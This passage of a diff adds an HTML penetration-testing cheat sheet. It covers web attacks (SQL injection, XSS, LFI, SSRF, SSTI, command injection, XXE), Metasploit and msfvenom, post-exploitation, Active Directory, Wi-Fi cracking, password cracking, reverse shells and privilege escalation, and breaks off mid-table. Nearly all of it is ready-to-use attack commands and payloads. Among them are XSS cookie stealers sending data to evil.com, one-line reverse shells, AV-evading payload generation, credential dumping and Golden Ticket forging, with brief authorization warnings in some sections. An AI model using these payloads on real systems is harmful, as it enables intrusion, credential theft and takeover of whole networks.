+      <tr><td>sqlmap -u URL --os-shell</td><td>OS shell via SQL</td><td>Only if DB user has FILE privilege</td></tr>
+      <tr><td>sqlmap -u URL --batch --random-agent</td><td>Automated</td><td>No prompts, random User-Agent</td></tr>
+      <tr><td>' OR '1'='1</td><td>Manual login bypass</td><td>Classic auth bypass payload</td></tr>
+      <tr><td>' UNION SELECT 1,2,3--</td><td>Column count</td><td>Find number of columns in query</td></tr>
+      <tr><td>' UNION SELECT null,table_name,null FROM information_schema.tables--</td><td>Table enum</td><td>MySQL/MSSQL information_schema</td></tr>
+    </table>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">XSS — Cross-Site Scripting</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> User input rendered in HTML without sanitization → browser executes script in target domain context → steal cookies, keylogger, phishing, BeEF hook.</div>
+      <table class="ct">
+        <tr><td>&lt;script&gt;alert(1)&lt;/script&gt;</td><td>Basic test</td><td>Alert box = XSS confirmed</td></tr>
+        <tr><td>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</td><td>Attribute break</td><td>Break out of value="..."</td></tr>
+        <tr><td>&lt;img src=x onerror=alert(1)&gt;</td><td>Event handler</td><td>When &lt;script&gt; is filtered</td></tr>
+        <tr><td>&lt;svg onload=alert(1)&gt;</td><td>SVG payload</td><td>Works in many WAF bypasses</td></tr>
+        <tr><td>javascript:alert(1)</td><td>URL-based</td><td>In href attributes</td></tr>
+        <tr><td>&lt;img src=x onerror="fetch('//evil.com/'+document.cookie)"&gt;</td><td>Cookie stealer</td><td>Session hijacking</td></tr>
+        <tr><td>XSStrike -u "http://t/?q=test" --crawl</td><td>Auto scanner</td><td>WAF bypass + smart payloads + crawl</td></tr>
+        <tr><td>&lt;script&gt;new Image().src="//evil.com/"+document.cookie&lt;/script&gt;</td><td>Image exfil</td><td>Alternative cookie steal</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">LFI / RFI</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> <code>include($_GET['page'])</code> → <code>?page=../../../etc/passwd</code> → Navigate out of web root. With log poisoning → RCE. RFI (Remote File Inclusion): include remote URL if <code>allow_url_include=On</code>.</div>
+      <table class="ct">
+        <tr><td>../../../etc/passwd</td><td>Linux users</td><td>All users, login shells</td></tr>
+        <tr><td>../../../etc/shadow</td><td>Password hashes</td><td>Only if running as root</td></tr>
+        <tr><td>....//....//etc/passwd</td><td>Filter bypass</td><td>When "../" is filtered/removed</td></tr>
+        <tr><td>..%2F..%2F..%2Fetc%2Fpasswd</td><td>URL encoding</td><td>URL-decode bypass</td></tr>
+        <tr><td>php://filter/convert.base64-encode/resource=index</td><td>PHP source</td><td>Read PHP source without executing</td></tr>
+        <tr><td>php://input</td><td>POST as file</td><td>POST PHP code → executes (RFI via PHP wrapper)</td></tr>
+        <tr><td>/proc/self/environ</td><td>ENV vars</td><td>Log poison: curl -A '&lt;?php system($_GET["cmd"]);?&gt;'</td></tr>
+        <tr><td>/var/log/apache2/access.log</td><td>Log poisoning</td><td>Inject code in User-Agent → include log → RCE</td></tr>
+        <tr><td>expect://id</td><td>RCE wrapper</td><td>Only if expect PHP extension enabled</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">SSRF — Server-Side Request Forgery</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> Server fetches a URL you control → access internal services (metadata APIs, internal HTTP, port scan from inside). <strong>Critical on AWS:</strong> http://169.254.169.254 = IAM credentials.</div>
+      <table class="ct">
+        <tr><td>http://localhost/admin</td><td>Internal access</td><td>Bypass IP allowlists</td></tr>
+        <tr><td>http://169.254.169.254/latest/meta-data/iam/security-credentials/</td><td>AWS metadata</td><td>IAM role credentials → full AWS access</td></tr>
+        <tr><td>http://metadata.google.internal/computeMetadata/v1/</td><td>GCP metadata</td><td>Requires header: Metadata-Flavor: Google</td></tr>
+        <tr><td>http://192.168.1.1/</td><td>Internal network</td><td>Access services behind firewall</td></tr>
+        <tr><td>file:///etc/passwd</td><td>Local files</td><td>Read files from server filesystem</td></tr>
+        <tr><td>http://attacker.com/  (via interactsh)</td><td>Blind SSRF detect</td><td>interactsh-client → unique URL per test</td></tr>
+        <tr><td>dict://localhost:6379/INFO</td><td>Redis via SSRF</td><td>Interact with internal Redis</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">SSTI — Server-Side Template Injection</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> User input is passed directly into a template engine (Jinja2, Twig, Freemarker) → template syntax executes on server → RCE. Test: <code>{{7*7}}</code> → if output is 49 → SSTI!</div>
+      <table class="ct">
+        <tr><td>{{7*7}}</td><td>Detection</td><td>Output 49 = Jinja2/Twig confirmed</td></tr>
+        <tr><td>${7*7}</td><td>Detection</td><td>Output 49 = Freemarker/Velocity</td></tr>
+        <tr><td>{{''.__class__.__mro__[1].__subclasses__()}}</td><td>Jinja2 enum</td><td>List all Python subclasses</td></tr>
+        <tr><td>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</td><td>Jinja2 RCE</td><td>Execute OS commands</td></tr>
+        <tr><td>{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</td><td>Jinja2 RCE alt</td><td>Alternative if config blocked</td></tr>
+        <tr><td>&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}</td><td>Freemarker RCE</td><td>Java-based RCE</td></tr>
+        <tr><td>tplmap -u "http://target/?name=*"</td><td>Auto detection</td><td>Tests all engines automatically</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">COMMAND INJECTION</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> User input passed to shell functions (system(), exec(), popen()) without sanitization → inject additional OS commands. Test: <code>; id</code> or <code>&amp;&amp; id</code>.</div>
+      <table class="ct">
+        <tr><td>; id</td><td>Semicolon</td><td>Command separator (Linux)</td></tr>
+        <tr><td>&amp;&amp; id</td><td>AND chain</td><td>Execute if previous succeeded</td></tr>
+        <tr><td>|| id</td><td>OR chain</td><td>Execute if previous failed</td></tr>
+        <tr><td>| id</td><td>Pipe</td><td>Pipe output to id command</td></tr>
+        <tr><td>`id`</td><td>Backtick</td><td>Command substitution</td></tr>
+        <tr><td>$(id)</td><td>$() subshell</td><td>Modern command substitution</td></tr>
+        <tr><td>%0aid</td><td>URL-encoded newline</td><td>Newline = command separator</td></tr>
+        <tr><td>commix -u "http://target/?ip=127.0.0.1" --all</td><td>Auto scanner</td><td>Tests all injection points</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">XXE — XML External Entity</div>
+      <div class="ex" style="font-size:11px;"><strong>How:</strong> XML parser processes external entity references → read local files, SSRF, port scan. Look for XML input: file uploads, SOAP APIs, XML-based REST.</div>
+      <table class="ct">
+        <tr><td colspan="3" style="color:var(--gr);font-size:11px;">Basic XXE — read /etc/passwd:</td></tr>
+        <tr><td>&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</td><td>File read</td><td>Returns /etc/passwd in response</td></tr>
+        <tr><td>SYSTEM "http://attacker.com/"</td><td>Blind XXE / SSRF</td><td>OOB data exfiltration</td></tr>
+        <tr><td>SYSTEM "file:///c:/windows/win.ini"</td><td>Windows file</td><td>Read Windows system files</td></tr>
+        <tr><td>php://filter/convert.base64-encode/resource=/etc/passwd</td><td>PHP wrapper</td><td>Base64-encoded file read</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">API TESTING</div>
+    <div class="ex"><strong>Modern APIs:</strong> REST/GraphQL APIs often have weaker security than web UIs. Look for: no rate limiting, IDOR (change user_id in request), mass assignment, auth bypass, verbose error messages exposing internals.</div>
+    <table class="ct">
+      <tr><th>Attack</th><th>Command / Payload</th><th>Notes</th></tr>
+      <tr><td>Auth bypass</td><td>curl -H "Authorization: Bearer null" http://api/v1/users</td><td>Try: null, undefined, none, empty, admin</td></tr>
+      <tr><td>IDOR</td><td>GET /api/v1/users/1337 → /api/v1/users/1338</td><td>Change numeric IDs → access other users</td></tr>
+      <tr><td>GraphQL introspection</td><td>{"query":"{__schema{types{name}}}"}</td><td>Dumps entire API schema</td></tr>
+      <tr><td>Mass assignment</td><td>POST /api/users {"role":"admin","isAdmin":true}</td><td>Add extra fields → privilege escalation</td></tr>
+      <tr><td>Rate limit test</td><td>ffuf -u http://api/login -w pass.txt -X POST -d 'pass=FUZZ'</td><td>No 429 = no rate limit → bruteforce!</td></tr>
+      <tr><td>Version enum</td><td>curl http://api/v2/ → /v1/ → /v3/ → /beta/</td><td>Old versions often have less security</td></tr>
+      <tr><td>Method tampering</td><td>GET /api/delete → POST /api/delete → PUT</td><td>Wrong methods may be allowed</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 09 EXPLOITATION ════════════════════════════════════ -->
+<div class="sec" id="exploit">
+  <div class="st">EXPLO<span>IT</span></div>
+  <div class="sd">METASPLOIT · MSFVENOM · PAYLOADS — AUTHORIZED SYSTEMS ONLY</div>
+  <div class="al">⚠ Exploitation without authorization is a criminal offense. Lab systems or authorized pen-tests only!</div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">Metasploit Basics</div>
+      <table class="ct">
+        <tr><td>msfconsole</td><td>Start framework</td><td>Interactive console</td></tr>
+        <tr><td>search eternalblue</td><td>Search exploits</td><td>By name, CVE, platform</td></tr>
+        <tr><td>use exploit/windows/smb/ms17_010_eternalblue</td><td>Load exploit</td><td>EternalBlue — WannaCry</td></tr>
+        <tr><td>show options</td><td>Show options</td><td>Required = must be set</td></tr>
+        <tr><td>set RHOSTS 192.168.1.10</td><td>Set target</td><td>Also ranges: 192.168.1.0/24</td></tr>
+        <tr><td>set LHOST 192.168.1.5</td><td>Own IP</td><td>For reverse shell</td></tr>
+        <tr><td>check</td><td>Vulnerable?</td><td>Test WITHOUT exploiting</td></tr>
+        <tr><td>run / exploit</td><td>Launch exploit</td><td>On success: Meterpreter opens</td></tr>
+        <tr><td>sessions -l</td><td>Active sessions</td><td>All open shells</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">Meterpreter Commands</div>
+      <div class="ex" style="font-size:11px;"><strong>What Meterpreter is:</strong> Runs in RAM (no files on disk), TLS-encrypted, far more powerful than a normal shell.</div>
+      <table class="ct">
+        <tr><td>sysinfo</td><td>System info</td><td>OS, hostname, domain</td></tr>
+        <tr><td>getuid</td><td>Current user</td><td>NT AUTHORITY\SYSTEM = Admin</td></tr>
+        <tr><td>getsystem</td><td>PrivEsc</td><td>Auto privilege escalation</td></tr>
+        <tr><td>hashdump</td><td>Password hashes</td><td>Windows SAM → for hashcat</td></tr>
+        <tr><td>shell</td><td>CMD/bash</td><td>Normal shell in Meterpreter</td></tr>
+        <tr><td>upload /local /remote</td><td>Upload</td><td>Transfer tools to target</td></tr>
+        <tr><td>download C:\file</td><td>Download</td><td>Exfiltrate file</td></tr>
+        <tr><td>keyscan_start / keyscan_dump</td><td>Keylogger</td><td>Record keystrokes</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">msfvenom — Payload Generator</div>
+    <table class="ct">
+      <tr><td>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe</td><td>Windows EXE</td><td>x64 reverse shell</td></tr>
+      <tr><td>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell</td><td>Linux ELF</td><td>x86 reverse shell</td></tr>
+      <tr><td>msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php</td><td>PHP webshell</td><td>Upload to web server</td></tr>
+      <tr><td>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp</td><td>JSP webshell</td><td>Tomcat/JBoss</td></tr>
+      <tr><td>msfvenom -p windows/x64/meterpreter/reverse_tcp ... -e x86/shikata_ga_nai -i 5</td><td>Encoded</td><td>AV evasion (basic)</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 10 POST-EXPLOIT ════════════════════════════════════ -->
+<div class="sec" id="postexploit">
+  <div class="st">POST<span> EXPLOIT</span></div>
+  <div class="sd">ENUMERATION AFTER ACCESS — LATERAL MOVEMENT · FILE TRANSFER</div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">Linux Post-Exploit</div>
+      <table class="ct">
+        <tr><td>id && whoami && hostname && ip a</td><td>Who+where am I?</td><td>User, hostname, networks</td></tr>
+        <tr><td>sudo -l</td><td>Sudo rights</td><td>NOPASSWD: vim → :!/bin/bash = root!</td></tr>
+        <tr><td>find / -perm -4000 2>/dev/null</td><td>SUID binaries</td><td>→ gtfobins.github.io</td></tr>
+        <tr><td>cat /etc/crontab && ls /etc/cron*</td><td>Cron jobs</td><td>Root script + writable = PrivEsc</td></tr>
+        <tr><td>cat ~/.bash_history</td><td>Command history</td><td>Passwords in cleartext</td></tr>
+        <tr><td>ss -tunlp</td><td>Internal ports</td><td>Services not visible from outside</td></tr>
+        <tr><td>uname -r && cat /proc/version</td><td>Kernel version</td><td>DirtyPipe (≤5.16), DirtyCow</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">Windows Post-Exploit</div>
+      <table class="ct">
+        <tr><td>whoami /all</td><td>User + privileges</td><td>SeImpersonatePrivilege → Potato → SYSTEM</td></tr>
+        <tr><td>net users && net localgroup administrators</td><td>Users + admins</td><td>Who has local admin?</td></tr>
+        <tr><td>systeminfo | findstr "Hotfix"</td><td>Missing patches</td><td>→ PrintNightmare, PrintSpoofer</td></tr>
+        <tr><td>cmdkey /list</td><td>Saved credentials</td><td>Windows Credential Manager</td></tr>
+        <tr><td>reg query HKCU /f password /t REG_SZ /s</td><td>Registry passwords</td><td>VNC, AutoLogon, PuTTY</td></tr>
+        <tr><td>netstat -ano</td><td>Connections + PIDs</td><td>Internal services, active connections</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">FILE TRANSFER</div>
+    <table class="ct">
+      <tr><td>python3 -m http.server 8080</td><td>HTTP server (attacker)</td><td>Target can wget/curl from it</td></tr>
+      <tr><td>wget http://ATTACKER:8080/file -O /tmp/file</td><td>Linux download</td><td>Or: curl -o</td></tr>
+      <tr><td>certutil -urlcache -f http://IP/nc.exe C:\Temp\nc.exe</td><td>Windows LOLBin</td><td>Legit Windows tool → no AV alert</td></tr>
+      <tr><td>Invoke-WebRequest -Uri http://IP/file -OutFile C:\file</td><td>PowerShell</td><td>Alias: iwr</td></tr>
+      <tr><td>impacket-smbserver share ./loot -smb2support</td><td>SMB share</td><td>Windows: copy \\ATTACKER\share\file .</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 11 ACTIVE DIRECTORY ═════════════════════════════════ -->
+<div class="sec" id="activedir">
+  <div class="st">ACTIVE<span> DIR</span></div>
+  <div class="sd">KERBEROS · LDAP · BLOODHOUND · CERTIPY · LATERAL MOVEMENT</div>
+  <div class="al">⚠ Active Directory attacks on unauthorized networks are criminal offenses. Authorized pentests and labs only!</div>
+  <div class="ex"><strong>What is Active Directory?</strong> Microsoft's directory service — manages users, computers, groups, policies in Windows domains. Almost every corporate network runs AD. <span class="how">Why it matters:</span> Compromising AD = owning the entire network. One weak password, one misconfigured service, one vulnerable certificate template = Domain Admin.</div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">AD ENUMERATION</div>
+      <table class="ct">
+        <tr><th>Command</th><th>Tool</th><th>Notes</th></tr>
+        <tr><td>bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c all</td><td>BloodHound</td><td>Collect AD data without Windows</td></tr>
+        <tr><td>netexec smb DC_IP -u user -p pass --users</td><td>NetExec</td><td>Enumerate domain users</td></tr>
+        <tr><td>netexec smb DC_IP -u user -p pass --shares</td><td>NetExec</td><td>List SMB shares</td></tr>
+        <tr><td>ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w pass -b "DC=domain,DC=local"</td><td>ldapsearch</td><td>Raw LDAP queries</td></tr>
+        <tr><td>rpcclient -U "user%pass" DC_IP -c "enumdomusers"</td><td>rpcclient</td><td>RPC user enumeration</td></tr>
+        <tr><td>enum4linux -a -u user -p pass DC_IP</td><td>enum4linux</td><td>SMB/RPC/LDAP all-in-one</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">KERBEROS ATTACKS</div>
+      <div class="ex" style="font-size:11px;"><strong>How Kerberos works:</strong> User → AS-REQ → KDC → TGT → TGS-REQ → Service Ticket. Attacks target each step: AS-REP Roasting (no preauth), Kerberoasting (crack service tickets), Pass-the-Ticket, Golden Ticket.</div>
+      <table class="ct">
+        <tr><td>impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip DC_IP</td><td>AS-REP Roast</td><td>Users without Kerberos preauth</td></tr>
+        <tr><td>impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request</td><td>Kerberoast</td><td>Crack service account passwords</td></tr>
+        <tr><td>hashcat -m 13100 tgs_hash.txt rockyou.txt</td><td>Crack TGS</td><td>Kerberoast hash cracking</td></tr>
+        <tr><td>hashcat -m 18200 asrep_hash.txt rockyou.txt</td><td>Crack AS-REP</td><td>AS-REP Roast hash cracking</td></tr>
+        <tr><td>impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-... -domain domain.local admin</td><td>Golden Ticket</td><td>Forge TGT → permanent DA</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">AD CERTIFICATE ATTACKS (CERTIPY)</div>
+      <div class="ex" style="font-size:11px;"><strong>AD CS (Certificate Services):</strong> Issues certificates for authentication. Misconfigured templates → request cert as Domain Admin. <span class="how">ESC1-ESC8:</span> Known escalation paths.</div>
+      <table class="ct">
+        <tr><td>certipy find -u user@domain.local -p pass -dc-ip DC_IP</td><td>Enumerate templates</td><td>Find vulnerable cert templates</td></tr>
+        <tr><td>certipy req -u user@domain.local -p pass -ca CA-NAME -template VULN_TEMPLATE -upn admin@domain.local</td><td>ESC1 exploit</td><td>Request cert as admin</td></tr>
+        <tr><td>certipy auth -pfx admin.pfx -dc-ip DC_IP</td><td>Authenticate</td><td>Use forged cert → get NT hash</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">LATERAL MOVEMENT</div>
+      <table class="ct">
+        <tr><td>impacket-psexec domain.local/admin:pass@TARGET</td><td>PsExec</td><td>SYSTEM shell via SMB</td></tr>
+        <tr><td>impacket-wmiexec domain.local/admin:pass@TARGET</td><td>WMI Exec</td><td>Semi-interactive shell via WMI</td></tr>
+        <tr><td>evil-winrm -i TARGET -u admin -p pass</td><td>WinRM</td><td>PowerShell remoting (port 5985)</td></tr>
+        <tr><td>impacket-smbexec domain.local/admin:pass@TARGET</td><td>SMB Exec</td><td>Shell via SMB service</td></tr>
+        <tr><td>impacket-secretsdump domain.local/admin:pass@DC_IP</td><td>DCSync</td><td>Dump all domain hashes</td></tr>
+        <tr><td>netexec smb TARGETS -u admin -p pass -x "whoami"</td><td>Mass exec</td><td>Run commands on many hosts</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">PASS-THE-HASH / PASS-THE-TICKET</div>
+    <table class="ct">
+      <tr><th>Technique</th><th>Command</th><th>Notes</th></tr>
+      <tr><td>Pass-the-Hash</td><td>impacket-psexec -hashes :NT_HASH domain.local/admin@TARGET</td><td>No password needed — just the NTLM hash</td></tr>
+      <tr><td>Pass-the-Hash (WinRM)</td><td>evil-winrm -i TARGET -u admin -H NT_HASH</td><td>WinRM with hash</td></tr>
+      <tr><td>Pass-the-Hash (SMB)</td><td>netexec smb TARGET -u admin -H NT_HASH --shares</td><td>Enumerate shares with hash</td></tr>
+      <tr><td>Pass-the-Ticket</td><td>export KRB5CCNAME=ticket.ccache; impacket-psexec -k -no-pass domain.local/admin@TARGET</td><td>Use Kerberos ticket</td></tr>
+      <tr><td>Overpass-the-Hash</td><td>impacket-getTGT domain.local/admin -hashes :NT_HASH</td><td>Get TGT from NTLM hash</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 12 WIRELESS ════════════════════════════════════════ -->
+<div class="sec" id="wireless">
+  <div class="st">WIRE<span>LESS</span></div>
+  <div class="sd">WPA2 ATTACKS · HANDSHAKE CAPTURE · DEAUTH · PMKID</div>
+  <div class="al">⚠ Wireless attacks on foreign networks are criminal. Own or authorized networks only!</div>
+  <div class="ex"><strong>WPA2 attack in 3 steps:</strong> 1. Enable Monitor Mode. 2. Capture 4-way handshake (wait or send Deauth → client reconnects). 3. Crack handshake offline against wordlist (GPU: up to 1B passwords/sec). The key is never transmitted — only its hash.</div>
+
+  <div class="cb">
+    <div class="cbt">Aircrack-ng + PMKID</div>
+    <table class="ct">
+      <tr><td>airmon-ng start wlan0</td><td>Monitor mode</td><td>wlan0 → wlan0mon — sees all packets</td></tr>
+      <tr><td>airodump-ng wlan0mon</td><td>All WLANs</td><td>BSSID, channel, ESSID, clients</td></tr>
+      <tr><td>airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</td><td>Capture handshake</td><td>Wait for "WPA handshake" top right</td></tr>
+      <tr><td>aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon</td><td>Deauth attack</td><td>Client disconnects → reconnects → handshake!</td></tr>
+      <tr><td>aircrack-ng -w rockyou.txt capture-01.cap</td><td>Crack handshake</td><td>CPU-based, slow — better: hashcat</td></tr>
+      <tr><td>hcxdumptool -i wlan0mon -o capture.pcapng</td><td>PMKID capture</td><td>No client needed — AP alone is enough</td></tr>
+      <tr><td>hcxpcapngtool capture.pcapng -o hash.22000</td><td>For hashcat</td><td>hashcat -m 22000 hash.22000 rockyou.txt</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ══ 12 PASSWORDS ═══════════════════════════════════════ -->
+<div class="sec" id="passwords">
+  <div class="st">PASS<span>WORDS</span></div>
+  <div class="sd">HASH CRACKING · ONLINE BRUTEFORCE · WORDLIST CREATION</div>
+  <div class="ex"><strong>How cracking works:</strong> Passwords stored as hashes. Calculate hashes for millions of known passwords and compare. GPU: 50B MD5 hashes/second. <span class="how">Modes:</span> Dictionary (wordlist direct), Rules (wordlist + transforms: password→P@ssw0rd), Brute Force (all combos), Hybrid.</div>
+
+  <div class="cb">
+    <div class="cbt">Hashcat — GPU Cracking Reference</div>
+    <table class="ct">
+      <tr><th>Command / -m value</th><th>Hash type</th><th>Where found</th></tr>
+      <tr><td>hashcat -m 0 hash.txt rockyou.txt</td><td>MD5</td><td>Old web apps, PHP</td></tr>
+      <tr><td>hashcat -m 1000 hash.txt rockyou.txt</td><td>NTLM</td><td>Windows SAM, Active Directory</td></tr>
+      <tr><td>hashcat -m 1800 hash.txt rockyou.txt</td><td>sha512crypt $6$</td><td>Linux /etc/shadow (modern)</td></tr>
+      <tr><td>hashcat -m 22000 wpa.hc22000 rockyou.txt</td><td>WPA2 handshake</td><td>From aircrack/hcxtools</td></tr>
+      <tr><td>hashcat -m 13100 hash.txt rockyou.txt</td><td>Kerberoast TGS-REP</td><td>Active Directory Kerberos tickets</td></tr>
+      <tr><td>hashcat -m 5600 hash.txt rockyou.txt</td><td>NetNTLMv2</td><td>From Responder / SMB relay</td></tr>
+      <tr><td>hashcat -m 0 hash.txt rockyou.txt -r best64.rule</td><td>Dictionary + rules</td><td>password→Password1! P@ssw0rd</td></tr>
+      <tr><td>hashcat -m 0 hash.txt -a 3 ?u?l?l?l?d?d?d?d</td><td>Mask (brute force)</td><td>?u=upper, ?l=lower, ?d=digit</td></tr>
+    </table>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">John the Ripper</div>
+      <table class="ct">
+        <tr><td>john hash.txt</td><td>Auto-detect</td><td>Identifies hash type automatically</td></tr>
+        <tr><td>john --wordlist=rockyou.txt --rules hash.txt</td><td>Dict + rules</td><td>Enable transformations</td></tr>
+        <tr><td>unshadow /etc/passwd /etc/shadow > u.txt</td><td>Linux shadow</td><td>Combine both files</td></tr>
+        <tr><td>zip2john archive.zip > hash.txt</td><td>ZIP password</td><td>Extract hash for John</td></tr>
+        <tr><td>ssh2john id_rsa > hash.txt</td><td>SSH key password</td><td>Crack encrypted private key</td></tr>
+        <tr><td>keepass2john db.kdbx > hash.txt</td><td>KeePass DB</td><td>KeePass master password</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">Hydra — Online Bruteforce</div>
+      <table class="ct">
+        <tr><td>hydra -l admin -P rockyou.txt ssh://target</td><td>SSH</td><td>-l = user, -P = password list</td></tr>
+        <tr><td>hydra -L users.txt -P pass.txt rdp://target</td><td>RDP</td><td>-L = user list</td></tr>
+        <tr><td>hydra -l admin -P list.txt smb://target</td><td>SMB</td><td>Test Windows login</td></tr>
+        <tr><td>hydra -L u.txt -P p.txt target http-post-form "/login:u=^USER^&p=^PASS^:Invalid"</td><td>Web form</td><td>^USER^/^PASS^ = placeholders</td></tr>
+        <tr><td>-t 4 -w 3</td><td>Rate limiting</td><td>4 threads, 3s wait → no lockout</td></tr>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 13 REV SHELLS ═════════════════════════════════════ -->
+<div class="sec" id="revshells">
+  <div class="st">REV<span> SHELLS</span></div>
+  <div class="sd">REVERSE SHELLS — WHY REVERSE, HOW EACH VARIANT WORKS</div>
+  <div class="ex"><strong>Why reverse shell?</strong> The target connects BACK to you — bypasses inbound firewalls. <strong>Listener first:</strong> <code>nc -lvnp 4444</code> on your machine. Then execute shell payload on target. <span class="how">Upgrade shell:</span> <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> then <code>Ctrl+Z</code> → <code>stty raw -echo; fg</code> → <code>export TERM=xterm</code></div>
+
+  <div class="cb">
+    <div class="cbt">Generate with Script</div>
+    <div class="term"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">revshell_gen.py</div></div>
+      <pre><span class="c"># Generate all 12 variants at once:</span>
+python3 08_scripts/revshell_gen.py <span class="y">YOUR_IP</span> <span class="y">4444</span>
+
+<span class="c"># Start listener before running payload:</span>
+nc -lvnp 4444</pre>
+    </div>
+  </div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">Linux Shells</div>
+      <table class="ct">
+        <tr><td>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</td><td>Bash TCP</td><td>Most reliable on Linux</td></tr>
+        <tr><td>bash -i &gt;&amp; /dev/udp/IP/PORT 0&gt;&amp;1</td><td>Bash UDP</td><td>UDP — bypasses some firewalls</td></tr>
+        <tr><td>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc IP PORT &gt;/tmp/f</td><td>Netcat mkfifo</td><td>When nc -e not available</td></tr>
+        <tr><td>nc -e /bin/sh IP PORT</td><td>Netcat -e</td><td>Only if -e is compiled in</td></tr>
+        <tr><td>socat tcp-connect:IP:PORT exec:/bin/sh,pty,stderr,setsid,sigint,sane</td><td>Socat</td><td>Full TTY immediately</td></tr>
+      </table>
+    </div>
+    <div class="cb">
+      <div class="cbt">Script-Based Shells</div>
+      <table class="ct">
+        <tr><td>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));...'</td><td>Python3</td><td>Available almost everywhere</td></tr>
+        <tr><td>php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i &lt;&3 &gt;&3 2>&3");'</td><td>PHP</td><td>Web servers, shared hosting</td></tr>
+        <tr><td>perl -e 'use Socket;...connect...exec("/bin/sh -i");'</td><td>Perl</td><td>Old Linux systems</td></tr>
+        <tr><td>ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i &lt;&%d &gt;&%d 2>&%d",f,f,f)'</td><td>Ruby</td><td>Rails apps</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="cb">
+    <div class="cbt">Windows PowerShell</div>
+    <div class="term"><div class="tbar"><div class="dot dr"></div><div class="dot dy2"></div><div class="dot dg2"></div><div class="tt">PowerShell reverse shell</div></div>
+      <pre><span class="c"># Generate Base64 PowerShell payload:</span>
+python3 08_scripts/revshell_gen.py <span class="y">IP</span> <span class="y">PORT</span>
+<span class="c"># → PowerShell B64 variant auto-generated</span>
+
+<span class="c"># Or manual:</span>
+$client=New-Object Net.Sockets.TCPClient('<span class="y">IP</span>',<span class="y">PORT</span>);
+$stream=$client.GetStream();
+<span class="c"># [... full payload in revshell_gen.py output ...]</span>
+
+<span class="c"># Encode manually:</span>
+$cmd = '...payload...'
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))</pre>
+    </div>
+  </div>
+</div>
+
+<!-- ══ 14 PRIVESC ═════════════════════════════════════════ -->
+<div class="sec" id="privesc">
+  <div class="st">PRIV<span>ESC</span></div>
+  <div class="sd">PRIVILEGE ESCALATION — LINUX · WINDOWS · AUTOMATED TOOLS</div>
+
+  <div class="two">
+    <div class="cb">
+      <div class="cbt">Linux PrivEsc</div>
+      <table class="ct">
+        <tr><th>Vector</th><th>Command</th><th>Notes</th></tr>
+        <tr><td>SUID bit</td><td>find / -perm -4000 2>/dev/null</td><td>→ gtfobins.github.io for exploits</td></tr>
+        <tr><td>Sudo misconfig</td><td>sudo -l</td><td>NOPASSWD + vim/python/find = root</td></tr>
